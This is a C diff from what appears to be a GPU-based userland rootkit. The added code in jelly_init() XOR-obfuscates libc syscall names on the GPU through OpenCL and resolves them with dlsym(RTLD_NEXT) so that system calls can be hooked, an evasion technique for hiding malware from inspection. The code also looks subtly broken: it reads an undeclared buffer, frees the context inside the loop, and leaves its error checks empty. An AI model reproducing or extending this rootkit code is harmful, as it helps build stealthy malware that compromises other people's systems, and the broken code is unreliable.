@@ -78,10 +78,67 @@ cl_context create_ctx(const cl_device_id *dev){
 }
 
 void jelly_init(){
+    jelly->dev = create_device();
+    jelly->ctx = create_ctx(&jelly->dev);
+    jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYXOR__);
+
     int i;
 
     for(i = 0; i < SYSCALL_SIZE; i++){
-        syscall[i].syscall_func = dlsym(RTLD_NEXT, syscall_table[i]);
+	strcpy(buffer, syscall_table[i]);
+
+	/* stick it in the xor blender! */
+
+	input = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
+	local = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
+	group = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
+	if(err < 0){
+	    // buffer failed
+	}
+
+        // device command queue
+        jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);
+        if(err < 0){
+            // queue failed
+        }
+
+        // gpu kernel thread
+        jelly->kernels[7] = clCreateKernel(jelly->program, jelly_xor, &err);
+        if(err < 0){
+            // gpu kernel failed
+        }
+
+        // gpu kernel args
+        err = clSetKernelArg(jelly->kernels[7], 0, sizeof(cl_mem), &input);
+        err |= clSetKernelArg(jelly->kernels[7], 1, sizeof(cl_mem), &local);
+	err |= clSetKernelArg(jelly->kernels[7], 2, sizeof(cl_mem), &group);
+        if(err < 0){
+            // args failed
+        }
+
+        // host-device comm
+        err = clEnqueueNDRangeKernel(jelly->cq, jelly->kernels[7], 1, NULL, &global_xor_size, &local_xor_size, 0, NULL, NULL);
+        if(err < 0){
+            // enqueue failed
+        }
+
+        // read buf from gpu
+        err = clEnqueueReadBuffer(jelly->cq, output, CL_TRUE, 0, sizeof(buffer3), buffer3, 0, NULL, NULL);
+        if(err < 0){
+            // read buffer failed
+        } else{
+	    // xor'ed syscall example directly from gpu
+	    syscall[i].syscall_func = dlsym(RTLD_NEXT, buffer3);
+	    buffer3 = "";
+        }
+
+        clReleaseContext(jelly->ctx);
+        clReleaseProgram(jelly->program);
+        clReleaseMemObject(input);
+        clReleaseMemObject(local);
+	clReleaseMemObject(group);
+        clReleaseCommandQueue(jelly->cq);
+        clReleaseKernel(jelly->kernels[7]);
     }
 }
 
